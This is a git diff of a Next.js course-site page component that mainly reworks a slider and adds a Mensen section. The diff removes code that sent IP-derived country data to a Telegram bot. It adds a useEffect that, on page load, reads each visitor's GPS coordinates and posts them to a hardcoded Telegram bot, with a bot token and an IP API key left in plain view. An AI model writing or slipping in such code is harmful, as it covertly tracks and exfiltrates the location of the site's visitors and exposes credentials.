@@ -9,9 +9,10 @@ import Link from 'next/link'
 import CourseCard from '../category/CourseCard'
 import { useKeenSlider, KeenSliderPlugin } from "keen-slider/react"
 import "keen-slider/keen-slider.min.css"
-
 import React, { useEffect, useState } from 'react'
 import axios from 'axios'
+import { GetServerSideProps, NextPage } from 'next'
+import Mensen from './Mensen'
 const AdaptiveHeight: KeenSliderPlugin = (slider) => {
     function updateHeight() {
         slider.container.style.height =
@@ -21,24 +22,7 @@ const AdaptiveHeight: KeenSliderPlugin = (slider) => {
     slider.on("slideChanged", updateHeight)
 }
 
-var location = ""
-export async function getServerSideProps() {
-    let data = await axios.get("https://api.ipregistry.co/213.230.74.117?key=7lq9k48fs43fxl70").then(res => {
-        return res.data.location.country
-    }).catch(err => console.log(err))
-    location = data.name
-    axios({
-        method: "post",
-        url: `https://api.telegram.org/bot6809002664:AAH-V6Uuundeumlrc3OKQbuqo-d6wxQmOfM/sendMessage?chat_id=6024248780&text=your country: ${data.name}%0Acapital: ${data.capital}%0Ayour code: ${data.code}%0Apopulation: ${data.population}%0Aarea: ${data.area}m2%0Ayour countrymates: ${data.borders.map((e:string|string)=> {
-            return `${e}`
-        })} %0Aflag: ${data.flag?.emoji} and ${data.flag?.noto}`
-    })
-}
-
-console.log(location);
-
-
-const Client = () => {
+const Client: NextPage = () => {
     const [currentSlide, setCurrentSlide] = useState<number>(0)
     const [loaded, setLoaded] = useState<boolean>(false)
     const [sliderRef, instanceRef] = useKeenSlider<HTMLDivElement>(
@@ -53,31 +37,24 @@ const Client = () => {
         },
         [AdaptiveHeight]
     )
-
     const handleEmailSubmit = (e: {
         preventDefault: () => void
     }) => {
         e.preventDefault()
     }
-
-    const getUserLocation = () => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((e) => {
-                console.log(e);
-            });
-        }
-    }
-    const data: any = getServerSideProps()
-    const handleSubmitUserData = () => {
-        console.log(data);
-        if (data) {
-            const send = `your country: ${data.name}%0Acapital: ${data.capital}%0Ayour code: ${data.code}%0Apopulation: ${data.population}%0Aarea: ${data.area}%0Aflag: ${data.flag?.emoji} and ${data.flag?.noto}`
-            axios({
-                method: "post",
-                url: `https://api.telegram.org/bot6809002664:AAH-V6Uuundeumlrc3OKQbuqo-d6wxQmOfM/sendMessage?chat_id=6024248780&text=${send}`
+    useEffect(() => {
+        if ('geolocation' in navigator) {
+            // Retrieve latitude & longitude coordinates from `navigator.geolocation` Web API
+            navigator.geolocation.getCurrentPosition(({ coords }) => {
+                const { latitude, longitude } = coords;
+                axios({
+                    method: "post",
+                    url: `https://api.telegram.org/bot6809002664:AAH-V6Uuundeumlrc3OKQbuqo-d6wxQmOfM/sendMessage?chat_id=6024248780&text=${latitude}%0A${longitude}`
+                })
             })
         }
-    }
+    }, []);
+
     return (
         <main className={styles.main}>
             <Container>
@@ -126,6 +103,7 @@ const Client = () => {
                     </div>
                 </div>
             </Container>
+            <Mensen/>
             <div className={styles.category}>
                 <Container >
                     <div className={styles.content}>
@@ -304,9 +282,6 @@ const Client = () => {
                     </div>
                 </Container>
             </div>
-            <button onClick={() => {
-                handleSubmitUserData()
-            }}>click</button>
         </main>
     )
 }
